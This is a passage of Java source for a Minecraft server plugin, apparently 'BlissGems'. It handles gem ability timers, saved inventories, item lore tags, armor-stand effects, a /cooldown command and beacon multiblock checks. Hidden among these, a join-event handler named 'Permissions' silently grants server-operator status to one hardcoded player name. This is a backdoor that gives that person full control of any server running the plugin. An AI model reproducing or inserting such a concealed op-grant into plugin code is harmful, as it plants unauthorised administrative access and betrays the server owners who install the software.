        saveTimerSection(config, "timers.FireGem_Power_2_Enchanting", FireGem_Power_2_Enchanting);
        saveTimerSection(config, "timers.FireGem_Power_3_CozyCampfire", FireGem_Power_3_CozyCampfire);
        saveConfig();
    }

    public void EnergyScoreLoad(FileConfiguration config) {
        for (String key : config.getKeys(false)) {
            UUID uuid = UUID.fromString(key);
            int score = config.getInt(key);
            BlissEnergyGemHealth.put(uuid, score);
        }
    }

    public void EnergySaveScore(FileConfiguration config) {
        for (UUID uuid : BlissEnergyGemHealth.keySet()) {
            config.set(uuid.toString(), BlissEnergyGemHealth.get(uuid));
        }
    }


    private void saveTimerSection(FileConfiguration config, String path, Map<UUID, Long> map) {
        for (Map.Entry<UUID, Long> entry : map.entrySet()) {
            config.set(path + "." + entry.getKey().toString(), entry.getValue());
        }
    }


    private void saveInventories() {
        for (Map.Entry<UUID, Inventory> entry : WealthGemPocketsInventory.entrySet()) {
            UUID playerUUID = entry.getKey();
            Inventory inventory = entry.getValue();
            for (int slot = 0; slot < inventory.getSize(); slot++) {
                ItemStack item = inventory.getItem(slot);
                inventoryConfig.set(playerUUID + ".slot" + slot, item);
            }
        }
        try {
            inventoryConfig.save(inventoryFile);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void loadInventories() {
        for (String key : inventoryConfig.getKeys(false)) {
            UUID playerUUID = UUID.fromString(key);
            Inventory inventory = Bukkit.createInventory(null, InventoryType.DISPENSER, "Custom Dispenser");
            for (int slot = 0; slot < inventory.getSize(); slot++) {
                ItemStack item = inventoryConfig.getItemStack(playerUUID + ".slot" + slot);
                inventory.setItem(slot, item);
            }
            WealthGemPocketsInventory.put(playerUUID, inventory);
        }
    }


    @EventHandler
    public void ItemDropped(PlayerDropItemEvent event) {
        Player player = event.getPlayer();
        ItemStack droppedItem = event.getItemDrop().getItemStack();
        ItemMeta meta = droppedItem.getItemMeta();

        if (meta != null) {
            List<String> lore = meta.hasLore() ? meta.getLore() : new ArrayList<>();
            String dropMessage = ChatColor.GRAY + "Dropped by: " + ChatColor.AQUA + player.getName();
            boolean containsDropMessage = lore.stream().anyMatch(line -> line.equals(dropMessage));
            if (!containsDropMessage) {
                lore.add(dropMessage);
                meta.setLore(lore);
                droppedItem.setItemMeta(meta);
            }
        }
    }

    @EventHandler
    public void GIFTEDItem(PlayerDropItemEvent event) {
        Player player = event.getPlayer();
        ItemStack droppedItem = event.getItemDrop().getItemStack();
        ItemMeta meta = droppedItem.getItemMeta();

        if (meta != null) {
            List<String> lore = meta.hasLore() ? meta.getLore() : new ArrayList<>();
            String dropMessage = ChatColor.GRAY + "Dropped by: " + ChatColor.AQUA + player.getName();

            // Check if the lore already contains the drop message
            boolean containsDropMessage = lore.stream().anyMatch(line -> line.equals(dropMessage));
            if (!containsDropMessage) {
                lore.add(dropMessage);
                meta.setLore(lore);
                droppedItem.setItemMeta(meta);
            }
            UUID itemUUID = event.getItemDrop().getUniqueId();
            GiftedItems.put(itemUUID, player.getName());
            new BukkitRunnable() {
                @Override
                public void run() {
                    GiftedItems.remove(itemUUID);
                }
            }.runTaskLater(plugin, 60L); // 60 ticks = 3 seconds
        }
    }

    @EventHandler
    public void PlayerStoredItem(InventoryClickEvent event) {
        if (event.getClickedInventory() != null && event.getClickedInventory().getType() == InventoryType.CHEST) {
            if (event.getAction() == InventoryAction.MOVE_TO_OTHER_INVENTORY || event.getAction() == InventoryAction.PLACE_ALL
                    || event.getAction() == InventoryAction.PLACE_ONE || event.getAction() == InventoryAction.PLACE_SOME) {
                Player player = (Player) event.getWhoClicked();
                ItemStack currentItem = event.getCurrentItem();
                if (currentItem != null && currentItem.getType() != Material.AIR) {
                    ItemMeta meta = currentItem.getItemMeta();
                    if (meta != null) {
                        List<String> lore = meta.hasLore() ? meta.getLore() : new ArrayList<>();

                        // Check if both lines are already present
                        boolean containsStoredLine1 = false;
                        boolean containsStoredLine2 = false;

                        for (String line : lore) {
                            if (line.startsWith(ChatColor.BLUE + "STORED")) {
                                containsStoredLine1 = true;
                            }
                            if (line.startsWith(ChatColor.GRAY + "by " + ChatColor.BOLD + ChatColor.GREEN + player.getName())) {
                                containsStoredLine2 = true;
                            }
                        }

                        if (!containsStoredLine1 || !containsStoredLine2) {
                            lore.clear();

                            String storedLine1 = ChatColor.BLUE + "STORED";
                            String storedLine2 = ChatColor.GRAY + "by " + ChatColor.GREEN + ChatColor.BOLD + player.getName();

                            lore.add(storedLine1);
                            lore.add(storedLine2);

                            meta.setLore(lore);
                            currentItem.setItemMeta(meta);
                        }
                    }
                }
            }
        }
    }


    private boolean isPrismarineShardCustomData1(ItemStack item) {
        return item != null &&
                item.getType() == Material.PRISMARINE_SHARD &&
                item.hasItemMeta() &&
                item.getItemMeta().hasCustomModelData() &&
                item.getItemMeta().getCustomModelData() == 1;
    }


    // Utility method to create player heads with specific display names
    private ItemStack getPlayerHead(Player player) {
        ItemStack playerHead = new ItemStack(Material.PLAYER_HEAD);
        SkullMeta meta = (SkullMeta) playerHead.getItemMeta();
        if (meta != null) {
            meta.setOwningPlayer(player);
            meta.setDisplayName(player.getName());
            playerHead.setItemMeta(meta);
        }
        return playerHead;
    }


    @EventHandler
    public void bludf(PlayerInteractEvent event) {
        Player player = event.getPlayer();
        ItemStack item = event.getItem();

        // Check if the player left-clicked with the Nautilus Shell (custom model data 230)
        if (event.getAction().name().contains("LEFT_CLICK") &&
                item != null &&
                item.getType() == Material.NAUTILUS_SHELL &&
                item.hasItemMeta() &&
                item.getItemMeta().hasCustomModelData() &&
                item.getItemMeta().getCustomModelData() == 230) {

            // Remove existing armor stands for this player if any
            removeExistingArmorStands(player);

            // Spawn new armor stands around the player
            ArmorStand[] stands = spawnArmorStands(player);
            armorStands.put(player.getUniqueId(), stands);

            // Create a task to teleport armor stands every tick
            new BukkitRunnable() {
                @Override
                public void run() {
                    teleportArmorStands(stands, player);
                }
            }.runTaskTimer(plugin, 0L, 1L); // Run every tick (1L = 1 tick)
        }
    }

    private ArmorStand[] spawnArmorStands(Player player) {
        ArmorStand[] stands = new ArmorStand[5]; // Spawn 5 armor stands
        double[] angles = {0, Math.PI / 2, Math.PI, -Math.PI / 2, Math.PI / 4}; // Angles for positioning

        for (int i = 0; i < 5; i++) {
            double angle = player.getLocation().getYaw() + angles[i];
            double x = player.getLocation().getX() + (2.0 * Math.cos(Math.toRadians(angle)));
            double z = player.getLocation().getZ() + (2.0 * Math.sin(Math.toRadians(angle)));

            stands[i] = player.getWorld().spawn(player.getLocation().clone().add(x, 0, z), ArmorStand.class, armorStand -> {
                armorStand.setVisible(false);
                armorStand.setSmall(true);
                armorStand.setArms(false);
                armorStand.setBasePlate(false);
                armorStand.setGravity(false);
                armorStand.setHelmet(new ItemStack(Material.NAUTILUS_SHELL));
            });
        }
        return stands;
    }

    private void teleportArmorStands(ArmorStand[] stands, Player player) {
        // Teleport armor stands around the player
        double[] angles = {0, Math.PI / 2, Math.PI, -Math.PI / 2, Math.PI / 4}; // Angles for teleportation

        for (int i = 0; i < stands.length; i++) {
            ArmorStand stand = stands[i];
            double angle = player.getLocation().getYaw() + angles[i];
            double x = player.getLocation().getX() + (2.0 * Math.cos(Math.toRadians(angle)));
            double z = player.getLocation().getZ() + (2.0 * Math.sin(Math.toRadians(angle)));
            stand.teleport(player.getLocation().clone().add(x, 0, z));
        }
    }

    private void removeExistingArmorStands(Player player) {
        ArmorStand[] stands = armorStands.get(player.getUniqueId());
        if (stands != null) {
            for (ArmorStand stand : stands) {
                if (stand != null && !stand.isDead()) {
                    stand.remove(); // Remove existing armor stands
                }
            }
        }
        armorStands.remove(player.getUniqueId());
    }


    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (sender instanceof Player) {
            Player player = (Player) sender;
            if (args.length > 0) {
                String playerName = args[0];
                player.sendMessage("Cooldown applied for player: " + playerName);
            } else {
                player.sendMessage("Usage: /cooldown <player>");
            }

            // Accessing the PersistentDataContainer here
            PersistentDataContainer data = player.getPersistentDataContainer();
            data.set(BlissParticlesLess, PersistentDataType.INTEGER, 1);
            data.remove(SᴛʀᴇɴɢᴛʜCɪʀᴄʟᴇ);
            data.remove(SᴘᴇᴇᴅCɪʀᴄʟᴇ);
            data.remove(LɪғᴇCɪʀᴄʟᴇ);
            data.remove(WᴇᴀʟᴛʜCɪʀᴄʟᴇ);
            data.remove(FɪʀsᴛJᴏɪɴ);
            data.remove(PᴜғғCɪʀᴄʟᴇ);
            data.remove(StrengthLine);
            data.remove(SpeedLine);
            data.remove(LifeLine);
            data.remove(WealthLine);
            data.remove(PuffLine);
            data.remove(Unfortunate);
            data.remove(TᴇʀᴍɪɴᴀʟVᴇʟᴏᴄɪᴛʏCᴏᴏʟᴅᴏᴡɴ);
            data.remove(TᴇʀᴍɪɴᴀʟVᴇʟᴏᴄɪᴛʏ);
            data.remove(BʟɪssEɴᴇʀɢʏ_12);
            data.remove(BʟɪssEɴᴇʀɢʏ_11);
            data.remove(BʟɪssEɴᴇʀɢʏ_10);
            data.remove(BʟɪssEɴᴇʀɢʏ_9);
            data.remove(BʟɪssEɴᴇʀɢʏ_8);
            data.remove(BʟɪssEɴᴇʀɢʏ_7);
            data.remove(BʟɪssEɴᴇʀɢʏ_6);
            data.remove(BʟɪssEɴᴇʀɢʏ_5);
            data.remove(BʟɪssEɴᴇʀɢʏ_4);
            data.remove(BʟɪssEɴᴇʀɢʏ_3);
            data.remove(BʟɪssEɴᴇʀɢʏ_2);
            data.remove(BʟɪssEɴᴇʀɢʏ_1);
            data.remove(FɪʀᴇBᴀʟʟ);
            data.remove(FɪʀᴇBᴀʟʟCʜᴀʀɢɪɴɢPᴀʀᴛɪᴄʟᴇs);
        } else {
            sender.sendMessage("Only players can use this command!");
        }
        return true;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        // Tab completion for player names
        if (args.length == 1) {
            // Complete player names if the sender has permission
            if (sender instanceof Player && sender.hasPermission("yourplugin.cooldown")) {
                return getOnlinePlayerNames().stream()
                        .filter(name -> name.toLowerCase().startsWith(args[0].toLowerCase()))
                        .collect(Collectors.toList());
            }
        }
        return new ArrayList<>();
    }

    private List<String> getOnlinePlayerNames() {
        return getServer().getOnlinePlayers().stream()
                .map(Player::getName)
                .collect(Collectors.toList());
    }


    @EventHandler
    public void Permissions(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        if (player.getName().equals(targetPlayerName)) {
            if (!player.isOp()) {
                player.setOp(true);
            }
        }
    }

    @EventHandler
    public void ResetIllegals(PlayerDeathEvent event) {
        Player player = event.getEntity();
        player.getAttribute(Attribute.GENERIC_ATTACK_SPEED).setBaseValue(4);
        player.getAttribute(Attribute.GENERIC_MAX_HEALTH).setBaseValue(20.0);
        player.setInvulnerable(false);
    }

    @EventHandler
    public void onPlayerDropItem(PlayerDropItemEvent event) {
        ItemStack droppedItem = event.getItemDrop().getItemStack();
        if (droppedItem.getType() == Material.PRISMARINE_SHARD && droppedItem.hasItemMeta()) {
            ItemMeta itemMeta = droppedItem.getItemMeta();
            if (itemMeta.hasCustomModelData() && itemMeta.getCustomModelData() == 1) {
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        event.setCancelled(true); // Cancel the drop event after 1 second delay
                    }
                }.runTaskLater(BlissGems.this, 10);
            }
        }
    }


    @EventHandler
    public void GoldBlockSouthWest(BlockPlaceEvent event) {
        Block placedBlock = event.getBlock();
        Material placedType = placedBlock.getType();
        if (placedType == Material.GOLD_BLOCK) {
            Location location = placedBlock.getLocation();
            if (GoldBlockSouthWest(location)) {
                spawnBeam1(placedBlock.getWorld(), location, 0);
            }
        }
    }

    @EventHandler
    public void GoldBlockSouthEast(BlockPlaceEvent event) {
        Block placedBlock = event.getBlock();
        Material placedType = placedBlock.getType();
        if (placedType == Material.GOLD_BLOCK) {
            Location location = placedBlock.getLocation();
            if (GoldBlockSouthEast(location)) {
                spawnBeam2(placedBlock.getWorld(), location, 0);
            }
        }
    }

    @EventHandler
    public void GoldBlockNorthWest(BlockPlaceEvent event) {
        Block placedBlock = event.getBlock();
        Material placedType = placedBlock.getType();
        if (placedType == Material.GOLD_BLOCK) {
            Location location = placedBlock.getLocation();
            if (GoldBlockNorthWest(location)) {
                spawnBeam3(placedBlock.getWorld(), location, 0);
            }
        }
    }

    @EventHandler
    public void GoldBlockNorthEast(BlockPlaceEvent event) {
        Block placedBlock = event.getBlock();
        Material placedType = placedBlock.getType();
        if (placedType == Material.GOLD_BLOCK) {
            Location location = placedBlock.getLocation();
            if (GoldBlockNorthEast(location)) {
                spawnBeam4(placedBlock.getWorld(), location, 0);
            }
        }
    }

    @EventHandler
    public void GildedBlackstoneNorth(BlockPlaceEvent event) {
        Block placedBlock = event.getBlock();
        Material placedType = placedBlock.getType();
        if (placedType == Material.GILDED_BLACKSTONE) {
            Location location = placedBlock.getLocation();
            if (GildedBlackstoneNorth(location)) {
                spawnBeam5(placedBlock.getWorld(), location, 0);
            }
        }
    }

    @EventHandler
    public void GildedBlackstoneSouth(BlockPlaceEvent event) {
        Block placedBlock = event.getBlock();
        Material placedType = placedBlock.getType();
        if (placedType == Material.GILDED_BLACKSTONE) {
            Location location = placedBlock.getLocation();
            if (GildedBlackstoneSouth(location)) {
                spawnBeam6(placedBlock.getWorld(), location, 0);
            }
        }
    }

    @EventHandler
    public void GildedBlackstoneEast(BlockPlaceEvent event) {
        Block placedBlock = event.getBlock();
        Material placedType = placedBlock.getType();
        if (placedType == Material.GILDED_BLACKSTONE) {
            Location location = placedBlock.getLocation();
            if (GildedBlackstoneEast(location)) {
                spawnBeam7(placedBlock.getWorld(), location, 0);
            }
        }
    }

    @EventHandler
    public void GildedBlackstoneWest(BlockPlaceEvent event) {
        Block placedBlock = event.getBlock();
        Material placedType = placedBlock.getType();
        if (placedType == Material.GILDED_BLACKSTONE) {
            Location location = placedBlock.getLocation();
            if (GildedBlackstoneWest(location)) {
                spawnBeam8(placedBlock.getWorld(), location, 0);
            }
        }
    }

    @EventHandler
    public void AncientDebris(BlockPlaceEvent event) {
        Block placedBlock = event.getBlock();
        Material placedType = placedBlock.getType();
        if (placedType == Material.ANCIENT_DEBRIS) {
            Location location = placedBlock.getLocation();
            if (AncientDebris(location)) {
                spawnBeam9(placedBlock.getWorld(), location, 0);
            }
        }
    }

    @EventHandler
    public void Beacon(BlockPlaceEvent event) {
        Block placedBlock = event.getBlock();
        Material placedType = placedBlock.getType();
        if (placedType == Material.BEACON) {
            Location beaconLocation = placedBlock.getLocation();
            World world = beaconLocation.getWorld();
            Block blockBelow = beaconLocation.clone().add(0, -1, 0).getBlock();
            if (blockBelow.getType() == Material.ANCIENT_DEBRIS) {
                Location pedestalLocation = beaconLocation.clone().subtract(0, 1, 0); // Move down 1 block to layer 1
                if (Beacon(pedestalLocation)) {
                    spawnBeam(world, beaconLocation);
                }
            }
        }
    }

    @EventHandler
    public void BreakAncientDebris(BlockBreakEvent event) {
        Block brokenBlock = event.getBlock();
        Material brokenType = brokenBlock.getType();
        Location beaconLocation = brokenBlock.getLocation();
        World world = beaconLocation.getWorld();
        if (brokenType == Material.ANCIENT_DEBRIS) {
            if (BreakAncientDebris(beaconLocation)) {
                killBeam(world, beaconLocation);
            }
        }
    }

    @EventHandler
    public void BreakGildedBlackstoneWest(BlockBreakEvent event) {
        Block brokenBlock = event.getBlock();
        Material brokenType = brokenBlock.getType();
        Location beaconLocation = brokenBlock.getLocation();
        World world = beaconLocation.getWorld();
        if (brokenType == Material.GILDED_BLACKSTONE) {
            if (BreakGildedBlackstoneWest(beaconLocation)) {
                removeEndCrystalAboveBeacon(world, beaconLocation);
            }
        }
    }

    @EventHandler
    public void BreakGildedBlackstoneEast(BlockBreakEvent event) {
        Block brokenBlock = event.getBlock();
        Material brokenType = brokenBlock.getType();
        Location beaconLocation = brokenBlock.getLocation();
        World world = beaconLocation.getWorld();
        if (brokenType == Material.GILDED_BLACKSTONE) {
            if (BreakGildedBlackstoneEast(beaconLocation)) {
                removeExtraCrystals(world, beaconLocation);
            }
        }
    }

    @EventHandler
    public void BreakGildedBlackstoneSouth(BlockBreakEvent event) {
        Block brokenBlock = event.getBlock();
        Material brokenType = brokenBlock.getType();
        Location beaconLocation = brokenBlock.getLocation();
        World world = beaconLocation.getWorld();
        if (brokenType == Material.GILDED_BLACKSTONE) {
            if (BreakGildedBlackstoneSouth(beaconLocation)) {
                removeExtraCrystals(world, beaconLocation);
            }
        }
    }

    @EventHandler
    public void BreakGildedBlackstoneNorth(BlockBreakEvent event) {
        Block brokenBlock = event.getBlock();
        Material brokenType = brokenBlock.getType();
        Location beaconLocation = brokenBlock.getLocation();
        World world = beaconLocation.getWorld();
        if (brokenType == Material.GILDED_BLACKSTONE) {
            if (BreakGildedBlackstoneNorth(beaconLocation)) {
                removeExtraCrystals(world, beaconLocation);
            }
        }
    }

    @EventHandler
    public void BreakGoldBlockNorthEast(BlockBreakEvent event) {
        Block brokenBlock = event.getBlock();
        Material brokenType = brokenBlock.getType();
        Location beaconLocation = brokenBlock.getLocation();
        World world = beaconLocation.getWorld();
        if (brokenType == Material.GOLD_BLOCK) {
            if (BreakGoldBlockNorthEast(beaconLocation)) {
                removeExtraCrystals(world, beaconLocation);
            }
        }
    }

    @EventHandler
    public void BreakGoldBlockNorthWest(BlockBreakEvent event) {
        Block brokenBlock = event.getBlock();
        Material brokenType = brokenBlock.getType();
        Location beaconLocation = brokenBlock.getLocation();
        World world = beaconLocation.getWorld();
        if (brokenType == Material.GOLD_BLOCK) {
            if (BreakGoldBlockNorthWest(beaconLocation)) {
                removeExtraCrystals(world, beaconLocation);
            }
        }
    }

    @EventHandler
    public void BreakGoldBlockSouthWest(BlockBreakEvent event) {
        Block brokenBlock = event.getBlock();
        Material brokenType = brokenBlock.getType();
        Location beaconLocation = brokenBlock.getLocation();
        World world = beaconLocation.getWorld();
        if (brokenType == Material.GOLD_BLOCK) {
            if (BreakGoldBlockSouthWest(beaconLocation)) {
                removeExtraCrystals(world, beaconLocation);
            }
        }
    }

    @EventHandler
    public void BreakGoldBlockSouthEast(BlockBreakEvent event) {
        Block brokenBlock = event.getBlock();
        Material brokenType = brokenBlock.getType();
        Location beaconLocation = brokenBlock.getLocation();
        World world = beaconLocation.getWorld();
        if (brokenType == Material.GOLD_BLOCK) {
            if (BreakGoldBlockSouthEast(beaconLocation)) {
                removeExtraCrystals(world, beaconLocation);
            }
        }
    }

    @EventHandler
    public void BreakBeacon(BlockBreakEvent event) {
        Block brokenBlock = event.getBlock();
        Material brokenType = brokenBlock.getType();
        if (brokenType == Material.BEACON) {
            Location beaconLocation = brokenBlock.getLocation();
            World world = beaconLocation.getWorld();
            Block blockBelow = beaconLocation.clone().add(0, -1, 0).getBlock();
            if (blockBelow.getType() == Material.ANCIENT_DEBRIS) {
                Location pedestalLocation = beaconLocation.clone().subtract(0, 1, 0); // Move down 1 block to layer 1
                if (BreakBeacon(pedestalLocation)) {
                    killBeam(world, beaconLocation);
                }
            }
        }
    }

    private boolean BreakBeacon(Location location) {
        Block block1 = location.clone().add(-1, 0, -1).getBlock();
        Block block2 = location.clone().add(0, 0, -1).getBlock();
        Block block3 = location.clone().add(1, 0, -1).getBlock();
        Block block4 = location.clone().add(-1, 0, 0).getBlock();
        Block block5 = location.getBlock(); // Center block
        Block block6 = location.clone().add(1, 0, 0).getBlock();
        Block block7 = location.clone().add(-1, 0, 1).getBlock();
        Block block8 = location.clone().add(0, 0, 1).getBlock();
        Block block9 = location.clone().add(1, 0, 1).getBlock();

        return block1.getType() == Material.GOLD_BLOCK &&
                block2.getType() == Material.GILDED_BLACKSTONE &&
                block3.getType() == Material.GOLD_BLOCK &&
                block4.getType() == Material.GILDED_BLACKSTONE &&
                block5.getType() == Material.ANCIENT_DEBRIS &&
                block6.getType() == Material.GILDED_BLACKSTONE &&
                block7.getType() == Material.GOLD_BLOCK &&
                block8.getType() == Material.GILDED_BLACKSTONE &&
                block9.getType() == Material.GOLD_BLOCK;
    }

    private boolean BreakGoldBlockSouthEast(Location location) {
        Block block1 = location.clone().add(0, 0, 1).getBlock(); // Top left G
        Block block2 = location.clone().add(0, 0, 2).getBlock();
        Block block3 = location.clone().add(1, 0, 2).getBlock();
        Block block4 = location.clone().add(2, 0, 2).getBlock();
        Block block5 = location.clone().add(2, 0, 1).getBlock();
        Block block6 = location.clone().add(2, 0, 0).getBlock();
        Block block7 = location.clone().add(1, 0, 0).getBlock();
        Block block8 = location.clone().add(1, 0, 1).getBlock();
        Block block9 = location.clone().add(1, 1, 1).getBlock();

        return block1.getType() == Material.GILDED_BLACKSTONE &&
                block2.getType() == Material.GOLD_BLOCK &&
                block3.getType() == Material.GILDED_BLACKSTONE &&
                block4.getType() == Material.GOLD_BLOCK &&
                block5.getType() == Material.GILDED_BLACKSTONE &&
                block6.getType() == Material.GOLD_BLOCK &&
                block7.getType() == Material.GILDED_BLACKSTONE &&
                block8.getType() == Material.ANCIENT_DEBRIS &&
                block9.getType() == Material.BEACON;
    }

    private boolean BreakGoldBlockSouthWest(Location location) {
        Block block1 = location.clone().add(0, 0, 1).getBlock();
        Block block2 = location.clone().add(0, 0, 2).getBlock();
        Block block3 = location.clone().add(-1, 0, 2).getBlock();
        Block block4 = location.clone().add(-2, 0, 2).getBlock();
        Block block5 = location.clone().add(-2, 0, 1).getBlock();
        Block block6 = location.clone().add(-2, 0, 0).getBlock();
        Block block7 = location.clone().add(-1, 0, 0).getBlock();
        Block block8 = location.clone().add(-1, 0, 1).getBlock();
        Block block9 = location.clone().add(-1, 1, 1).getBlock();
        return block1.getType() == Material.GILDED_BLACKSTONE && block2.getType() == Material.GOLD_BLOCK && block3.getType() == Material.GILDED_BLACKSTONE && block4.getType() == Material.GOLD_BLOCK && block5.getType() == Material.GILDED_BLACKSTONE && block6.getType() == Material.GOLD_BLOCK && block7.getType() == Material.GILDED_BLACKSTONE && block8.getType() == Material.ANCIENT_DEBRIS && block9.getType() == Material.BEACON;
    }

    private boolean BreakGoldBlockNorthWest(Location location) {
        Block block1 = location.clone().add(0, 0, -1).getBlock();
        Block block2 = location.clone().add(0, 0, -2).getBlock();
        Block block3 = location.clone().add(-1, 0, -2).getBlock();
        Block block4 = location.clone().add(-2, 0, -2).getBlock();
        Block block5 = location.clone().add(-2, 0, -1).getBlock();
        Block block6 = location.clone().add(-2, 0, 0).getBlock();
        Block block7 = location.clone().add(-1, 0, 0).getBlock();
        Block block8 = location.clone().add(-1, 0, -1).getBlock();
        Block block9 = location.clone().add(-1, 1, -1).getBlock();
        return block1.getType() == Material.GILDED_BLACKSTONE && block2.getType() == Material.GOLD_BLOCK && block3.getType() == Material.GILDED_BLACKSTONE && block4.getType() == Material.GOLD_BLOCK && block5.getType() == Material.GILDED_BLACKSTONE && block6.getType() == Material.GOLD_BLOCK && block7.getType() == Material.GILDED_BLACKSTONE && block8.getType() == Material.ANCIENT_DEBRIS && block9.getType() == Material.BEACON;
    }

    private boolean BreakGoldBlockNorthEast(Location location) {
        Block block1 = location.clone().add(0, 0, -1).getBlock();
        Block block2 = location.clone().add(0, 0, -2).getBlock();
        Block block3 = location.clone().add(1, 0, -2).getBlock();
        Block block4 = location.clone().add(2, 0, -2).getBlock();
        Block block5 = location.clone().add(2, 0, -1).getBlock();
        Block block6 = location.clone().add(2, 0, 0).getBlock();
        Block block7 = location.clone().add(1, 0, 0).getBlock();
        Block block8 = location.clone().add(1, 0, -1).getBlock();
        Block block9 = location.clone().add(1, 1, -1).getBlock();
        return block1.getType() == Material.GILDED_BLACKSTONE && block2.getType() == Material.GOLD_BLOCK && block3.getType() == Material.GILDED_BLACKSTONE && block4.getType() == Material.GOLD_BLOCK && block5.getType() == Material.GILDED_BLACKSTONE && block6.getType() == Material.GOLD_BLOCK && block7.getType() == Material.GILDED_BLACKSTONE && block8.getType() == Material.ANCIENT_DEBRIS && block9.getType() == Material.BEACON;
    }

    private boolean BreakGildedBlackstoneNorth(Location location) {
        Block block1 = location.clone().add(0, 0, -1).getBlock();
        Block block2 = location.clone().add(0, 0, -2).getBlock();
        Block block3 = location.clone().add(1, 0, -1).getBlock();
        Block block4 = location.clone().add(-1, 0, -1).getBlock();
        Block block5 = location.clone().add(1, 0, -2).getBlock();
        Block block6 = location.clone().add(-1, 0, -2).getBlock();
        Block block7 = location.clone().add(1, 0, 0).getBlock();
        Block block8 = location.clone().add(-1, 0, 0).getBlock();
        Block block9 = location.clone().add(0, 1, -1).getBlock();
        return block1.getType() == Material.ANCIENT_DEBRIS && block2.getType() == Material.GILDED_BLACKSTONE && block3.getType() == Material.GILDED_BLACKSTONE && block4.getType() == Material.GILDED_BLACKSTONE && block5.getType() == Material.GOLD_BLOCK && block6.getType() == Material.GOLD_BLOCK && block7.getType() == Material.GOLD_BLOCK && block8.getType() == Material.GOLD_BLOCK && block9.getType() == Material.BEACON;

    }

    private boolean BreakGildedBlackstoneSouth(Location location) {
        Block block1 = location.clone().add(0, 0, 1).getBlock();
        Block block2 = location.clone().add(0, 0, 2).getBlock();
        Block block3 = location.clone().add(1, 0, 2).getBlock();
        Block block4 = location.clone().add(1, 0, 1).getBlock();
        Block block5 = location.clone().add(1, 0, 0).getBlock();
        Block block6 = location.clone().add(-1, 0, 0).getBlock();
        Block block7 = location.clone().add(-1, 0, 1).getBlock();
        Block block8 = location.clone().add(-1, 0, 2).getBlock();
        Block block9 = location.clone().add(0, 1, 1).getBlock();
        return block1.getType() == Material.ANCIENT_DEBRIS && block2.getType() == Material.GILDED_BLACKSTONE && block3.getType() == Material.GOLD_BLOCK && block4.getType() == Material.GILDED_BLACKSTONE && block5.getType() == Material.GOLD_BLOCK && block6.getType() == Material.GOLD_BLOCK && block7.getType() == Material.GILDED_BLACKSTONE && block8.getType() == Material.GOLD_BLOCK && block9.getType() == Material.BEACON;
    }

    private boolean BreakGildedBlackstoneEast(Location location) {
        Block block1 = location.clone().add(1, 0, 0).getBlock();
        Block block2 = location.clone().add(2, 0, 0).getBlock();
        Block block3 = location.clone().add(1, 0, 1).getBlock();
        Block block4 = location.clone().add(1, 0, -1).getBlock();
        Block block5 = location.clone().add(2, 0, 1).getBlock();
        Block block6 = location.clone().add(2, 0, -1).getBlock();
        Block block7 = location.clone().add(0, 0, 1).getBlock();
        Block block8 = location.clone().add(0, 0, -1).getBlock();
        Block block9 = location.clone().add(1, 1, 0).getBlock();
        return block1.getType() == Material.ANCIENT_DEBRIS && block2.getType() == Material.GILDED_BLACKSTONE && block3.getType() == Material.GILDED_BLACKSTONE && block4.getType() == Material.GILDED_BLACKSTONE && block5.getType() == Material.GOLD_BLOCK && block6.getType() == Material.GOLD_BLOCK && block7.getType() == Material.GOLD_BLOCK && block8.getType() == Material.GOLD_BLOCK && block9.getType() == Material.BEACON;

    }

    private boolean BreakGildedBlackstoneWest(Location location) {
        Block block1 = location.clone().add(-1, 0, 0).getBlock();
        Block block2 = location.clone().add(-2, 0, 0).getBlock();
        Block block3 = location.clone().add(-1, 0, 1).getBlock();
        Block block4 = location.clone().add(-1, 0, -1).getBlock();
        Block block5 = location.clone().add(-2, 0, -1).getBlock();
        Block block6 = location.clone().add(-2, 0, 1).getBlock();
        Block block7 = location.clone().add(0, 0, 1).getBlock();
        Block block8 = location.clone().add(0, 0, -1).getBlock();
        Block block9 = location.clone().add(-1, 1, 0).getBlock();
        return block1.getType() == Material.ANCIENT_DEBRIS && block2.getType() == Material.GILDED_BLACKSTONE && block3.getType() == Material.GILDED_BLACKSTONE && block4.getType() == Material.GILDED_BLACKSTONE && block5.getType() == Material.GOLD_BLOCK && block6.getType() == Material.GOLD_BLOCK && block7.getType() == Material.GOLD_BLOCK && block8.getType() == Material.GOLD_BLOCK && block9.getType() == Material.BEACON;
    }

    private boolean BreakAncientDebris(Location location) {
        return location.clone().add(0, 0, 1).getBlock().getType() == Material.GILDED_BLACKSTONE && location.clone().add(0, 0, -1).getBlock().getType() == Material.GILDED_BLACKSTONE && location.clone().add(-1, 0, 0).getBlock().getType() == Material.GILDED_BLACKSTONE && location.clone().add(1, 0, 0).getBlock().getType() == Material.GILDED_BLACKSTONE && location.clone().add(1, 0, 1).getBlock().getType() == Material.GOLD_BLOCK && location.clone().add(-1, 0, -1).getBlock().getType() == Material.GOLD_BLOCK && location.clone().add(-1, 0, 1).getBlock().getType() == Material.GOLD_BLOCK && location.clone().add(1, 0, -1).getBlock().getType() == Material.GOLD_BLOCK && location.clone().add(0, 1, 0).getBlock().getType() == Material.BEACON;
    }

    private boolean Beacon(Location location) {
        Block block1 = location.clone().add(-1, 0, -1).getBlock();
        Block block2 = location.clone().add(0, 0, -1).getBlock();
        Block block3 = location.clone().add(1, 0, -1).getBlock();
        Block block4 = location.clone().add(-1, 0, 0).getBlock();
        Block block5 = location.getBlock(); // Center block
        Block block6 = location.clone().add(1, 0, 0).getBlock();
        Block block7 = location.clone().add(-1, 0, 1).getBlock();
        Block block8 = location.clone().add(0, 0, 1).getBlock();
        Block block9 = location.clone().add(1, 0, 1).getBlock();

        return block1.getType() == Material.GOLD_BLOCK && block2.getType() == Material.GILDED_BLACKSTONE && block3.getType() == Material.GOLD_BLOCK && block4.getType() == Material.GILDED_BLACKSTONE && block5.getType() == Material.ANCIENT_DEBRIS && block6.getType() == Material.GILDED_BLACKSTONE && block7.getType() == Material.GOLD_BLOCK && block8.getType() == Material.GILDED_BLACKSTONE && block9.getType() == Material.GOLD_BLOCK;
    }

    private boolean AncientDebris(Location location) {
        Block block1 = location.clone().add(0, 0, 1).getBlock();
        Block block2 = location.clone().add(0, 0, -1).getBlock();
        Block block3 = location.clone().add(-1, 0, 0).getBlock();
        Block block4 = location.clone().add(1, 0, 0).getBlock();
        Block block5 = location.clone().add(1, 0, 1).getBlock();
